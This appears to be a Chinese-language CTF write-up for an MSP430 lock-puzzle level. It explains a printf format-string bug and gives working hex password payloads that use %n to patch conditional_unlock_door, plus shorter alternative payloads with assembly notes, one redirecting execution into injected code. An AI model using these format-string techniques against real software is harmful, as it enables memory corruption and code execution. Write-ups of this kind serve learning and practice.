```
漏洞
跟前一題一樣有 fsb 漏洞

不同的地方是
printf
46b6:  2f49           mov	@r9, r15
46b8:  8f4a 0000      mov	r10, 0x0(r15)

如果你去 trace code 你會發現
%n 寫入的位址是由 r9 的值決定
而 r9 指向 password 的位址
因此 password 前 2 byte 決定 %n 覆蓋的地方

那這次要蓋哪呢？
因為這次 password 有夠大的，大到可涵蓋 0x7f 以上
聽出來了嗎？
這次要蓋的就是 conditional_unlock_door 的 0x7e 把他蓋成 0x7f
以我來說，我要蓋的位址在 0x448c

password = c844aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa256e

note:
0x256e : %n


其他大大的解法

5 bytes : 5245256e7f

4550:  0f12           push	r15
4552:  0312           push	#0x0   <- 將此行改成 0200 : rrc sr (可忽略)
4554:  814f 0400      mov	r15, 0x4(sp)

這樣一來就相當於只有 push r15
如果 r15 = 0x7f 就能破關了
而 r15 在 printf 中恰好是放下個字元也就是 7f
這到底是 trace 過多少次阿... 


8bytes : 83ffc8442573256e

2573: %s 
2563: %n

83ff: 第一個位址(參數)
c844: 第二個位址(參數)

也就是將 0x83ff 當作字串印出來 ff80 ~ fffe
恰好 0x7f 個，這...太強了


12byte : d644256e1e530e12b0123645

將 conditional_unlock_door 的 pop r4 拿掉
因此 ret 時會跳到原本應該到 r4 的值 
也就是 0044 (br r4) , 執行後會跳到 r4 (0x420a : password 的起始位址)
接著就能塞 shell code 拉 （ 阿，應該是 unlock door code)
```
